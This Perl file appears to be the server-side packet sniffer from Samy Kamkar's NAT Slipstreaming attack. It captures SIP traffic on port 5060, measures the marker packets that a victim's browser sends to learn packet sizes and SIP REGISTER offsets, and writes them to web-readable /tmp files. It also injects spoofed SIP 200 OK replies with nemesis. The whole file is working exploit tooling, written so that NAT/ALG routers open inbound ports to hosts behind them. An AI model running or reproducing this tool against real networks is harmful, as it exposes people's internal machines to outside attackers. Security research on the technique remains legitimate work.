#!/usr/bin/perl
#
# capture max packet size
# nat slipstreaming sniffer
# -samy kamkar, 4/7/2019

my $DEV = "eth0";
my $ETH_LEN = 14;
my $MTU = 1500;

#my ($MTU) = (`ifconfig $DEV` =~ /MTU:(\d+)/);
#my $MTU ||= 1500;
system("ifconfig $DEV mtu $MTU");

my ($route) = (grep { /^default/ } split(/\n/, `ip route`));
$route =~ s/advmss\s+\d+//;
$route .= "advmss $MTU";
system("ip route replace $route");

$MTU += $ETH_LEN;
print "MTU $MTU\n";

use Net::Pcap;
use JSON;
use Data::Dumper;
use NetPacket::Ethernet qw/ETH_TYPE_IP/;
use NetPacket::IP qw/IP_PROTO_TCP IP_PROTO_UDP/;
use NetPacket::TCP qw/PSH/;
use NetPacket::UDP;
use strict;
my $INJECT = 'nemesis';
#no strict 'subs';

my %max;

my $PAD = "^_"; # \r\n";
my $SCAN = 'SAMY_MAXPKTSIZE';
my $BEGIN = "BEGIN_$SCAN=";
my $END = "END_$SCAN";
my $SIPURL = 'sip:samy.pl;transport';
my $filter_str = "port 5060";
my $err = '';
my $dev = pcap_lookupdev(\$err);  # find a device
my %users;

my $filter;
my $DATA = join "", <DATA>;

# open the device for live listening
my $pcap = pcap_open_live($dev, 1024*10, 0, 0, \$err);
my ($pktid, $eth, $ip, $tcp, $udp, $data);

# compile the filter
pcap_compile($pcap, \$filter, $filter_str, 1, 0) == 0 or die "fatal: filter error\n";
pcap_setfilter($pcap, $filter);
pcap_loop($pcap, 0, \&process_packet, "samypkt");

# close the device
pcap_close($pcap);

sub pr
{
  my $pkt = shift;
  $pkt =~ s|((?:$PAD){5,})|$PAD . "(pad*" . (length($1)/length($PAD)) . ")"|ge;
  print "GOT ^^^\n$pkt\n^^^\n\n";
}

sub process_packet
{
  my ($user_data, $header, $packet) = @_;
  my %len = ('hlen' => $header->{len});

  $data = $tcp = $udp = $eth = $ip = undef;
  $eth = NetPacket::Ethernet->decode($packet);
  $ip = NetPacket::IP->decode($eth->{type} == ETH_TYPE_IP ? $eth->{data} : $packet);
  if ($ip->{proto} == IP_PROTO_TCP)
  {
    $tcp = NetPacket::TCP->decode($ip->{data});
    $data = $tcp->{data};
    $pktid = "t$ip->{src_ip}^$ip->{dest_ip}^$tcp->{dest_port}";
    #$pktid = "t$ip->{src_ip}^$ip->{dest_ip}^$tcp->{src_port}^$tcp->{dest_port}";
  }
  elsif ($ip->{proto} == IP_PROTO_UDP)
  {
    $udp = NetPacket::UDP->decode($ip->{data});
    $data = $udp->{data};
    $pktid = "u$ip->{src_ip}^$ip->{dest_ip}^$udp->{dest_port}";
    #$pktid = "u$ip->{src_ip}^$ip->{dest_ip}^$udp->{src_port}^$udp->{dest_port}";
  }
  else { print "WTF? unknown proto $ip->{proto}\n"; }

  # get max packet size

  my $len = length($eth->{data});
  print "pkt len=$len: " . unpack("H*", $packet) . "\n";
  return unless $udp || ($tcp && length($tcp->{data}));
  pr($data);

  # look for SAMY_MAXPKTSIZE (TCP MTU detection)
  my $ind = index($packet, $BEGIN);
  if ($ind >= 0)
  {
    # how many bytes we want to fill (before we modify $ind)
    $len{begin_ind} = $ind;

    # MAXPKTSIZE=
    $ind += length($BEGIN);

    # padding index
    my $padind = index($packet, $PAD, $ind);
    if ($padind >= 0)
    {
      my $id = substr($packet, $ind, $padind-$ind);
      %len = (%len, get_len($packet));
      $len{id} = $id;

      # track lengths
      $max{$pktid} = \%len;
      print "ok1 pktid=$pktid len=$ip->{len} oldlen $max{$pktid}{ip_len}\n";

      # cleanup
      $id =~ s/\D//g;
      my $npacket = $packet;
      $npacket =~ s/(\r?\n| ){5,}/...../g;
      print "$npacket\n";
      $len{stuff_bytes} = length($packet) - $len{begin_ind};

      print "ok4 ".length($packet) ." - $MTU - be $len{begin_ind}\n";
      # some services (digitalocean) combine packets into larger packets
      # despite `ifconig` mtu and `ip route` mss
      if (length($packet) > $MTU)
      {
        $len{orig_stuff_bytes} = $len{stuff_bytes};
        $len{orig_packet} = length($packet);
        $len{stuff_bytes} = $MTU - $len{begin_ind};
        #$len{stuff_bytes} = $len{ip_len} -  $len{begin_ind};
      }
      #$len{stuff_offset} = $ip->{len} - $len{stuff_bytes};
      # addUser($id, %len);
    }
  }
  else
  {
    print "ok2 pktid=$pktid len=$ip->{len} oldlen $max{$pktid}{max_ip_len}\n";
    # if this packet is larger than what we've seen, save it
    if ($max{$pktid}{max_ip_len} && $ip->{len} > $max{$pktid}{max_ip_len})
    {
      # rewrite new file with new max
      $max{$pktid}{stuff_bytes} = length($packet) - $max{$pktid}{begin_ind};
      if (length($packet) > $MTU)
      {
        $max{$pktid}{orig_stuff_bytes} = $max{$pktid}{stuff_bytes};
        $max{$pktid}{stuff_bytes} = $MTU - $max{$pktid}{begin_ind};
      }
      $max{$pktid}{max_ip_len} = $ip->{len};
      print "ok3 $max{$pktid}{id} new=$max{$pktid}{stuff_bytes} pktlen=" . length($packet). " ip_len=$ip->{len} old_ip_len=$max{$pktid}{max_ip_len}\n";
      addUser($max{$pktid}{id}, %{$max{$pktid}});
    }

    # look for sip:samy.pl;transport SIP REGISTER packet
    $ind = index($packet, $SIPURL);
    if ($ind >= 0)
    {
      # detect offset of packet in case we need to change offset in browser
      # communicated back to browser out-of-band via monitor.php
      my $offset = index($data, $SIPURL) - length('REGISTER ');
      my ($cid) = ($data =~ /Call-ID: a*(\d+)b/i);
      print "offset=$offset cid=$cid tcpdl=$max{$pktid}{tcp_data_len}\n";

      my $dh = $data;
      $dh =~ s/([^\w ])/"\\x" . unpack("H2", $1)/eg;

      my $file = "/tmp/.samy.regoff.$cid";
      my $origoffset = $offset;

      # our vm provider is merging these packest before reaching system even though ender has it broken up into diff packs
      while ($offset >= $max{$pktid}{tcp_data_len})
      {
	last if $max{$pktid}{tcp_data_len} <= 0;
        $offset -= $max{$pktid}{tcp_data_len};
      }
      print "now offset=$offset origoffset=$offset cid=$cid tcpdl=$max{$pktid}{tcp_data_len} ($file)\n";

      wf($file, "offset($offset, '$dh', $origoffset);\n");

      # if we're UDP, let's respond with INVITE (like serv-sip.pl would do)
      if ($udp)
      {
        sip_udp_respond($eth, $ip, $udp, $data);
      }
    }
  }

  # wait for last packet from test packet size before writing
  $ind = index($packet, $END);
  if ($ind >= 0)
  {
    print "ok WRITING! $max{$pktid}{id}\n";
    addUser($max{$pktid}{id}, %{$max{$pktid}});
  }
}

# respond to SIP UDP REGISTER (TURN server got the original packet and won't respond)
sub sip_udp_respond
{
  my ($eth, $ip, $udp, $data) = @_;

  # make data from SIP packet accessible
  my %vars = map { /^(\S+):\s*(.*)/; uc($1) => $2 } grep { /:/ } split(/\r?\n/, $data);

  print "data=$data\n";
  # prepare response
  my $resp = $DATA;
  $resp =~ s/\n/\r\n/g;
  $resp =~ s/\{(.*?)\}/$vars{$1}/eg;
  $resp .= "\r\n";

  my $rndfile = "/tmp/.samy.rndout." . time() . rand();
  wf($rndfile, $resp);

  # don't specify ethernet dev, otherwies you need to specify dest mac
  system($INJECT, "udp",
    "-S", $ip->{dest_ip},
    "-D", $ip->{src_ip},
    "-x", $udp->{dest_port},
    "-y", $udp->{src_port},
    "-P", $rndfile,
  );
  print << "EOF";
  $INJECT, "udp",
    "-S", $ip->{dest_ip},
    "-D", $ip->{src_ip},
    "-x", $udp->{dest_port},
    "-y", $udp->{src_port},
    "-P", $rndfile
EOF

  #unlink($rndfile);
}

# write to file
sub wf
{
  my ($file, $data) = @_;
  open(F, ">$file") || print STDERR "Can't write to $file: $!\n";
  print F $data;
  close(F);
  system("chown", "www-data", $file);
  #chmod(0666, $file);
}

sub get_len
{
  my $packet = shift;
  my %len;

  # decode the Ethernet frame
  #print "get_len:\n";
  #print unpack("H*", $packet). $/;

  $len{ip_len} = $ip->{len};
  $len{packet_len} = length($packet);
  $len{max_ip_len} = $ip->{len} if $ip->{len} > $len{max_ip_len};
  $len{ip_hlen} = $ip->{hlen};

  if ($tcp)
  {
    $len{tcp_hlen} = $tcp->{hlen};
    $len{tcp_data_len} = length($tcp->{data});
    $len{tcp_opts_len} = length($tcp->{options});
  }
  return %len;
}

sub addUser
{
  my ($id, %len) = @_;
  foreach my $key (keys %len) { $len{$key} =~ s/\D//g; }
  print "$id: " . Dumper(\%len) . "\n";

  wf("/tmp/.samy.pktsize.$id", encode_json(\%len));
}

__DATA__
SIP/2.0 200 OK
Via: {VIA};received=192.0.2.201
From: {FROM}
To: {TO};tag=37GkEhwl6
Call-ID: {CALL-ID}
CSeq: {CSEQ}
Contact: {CONTACT};expires=3600
Content-Length: 0
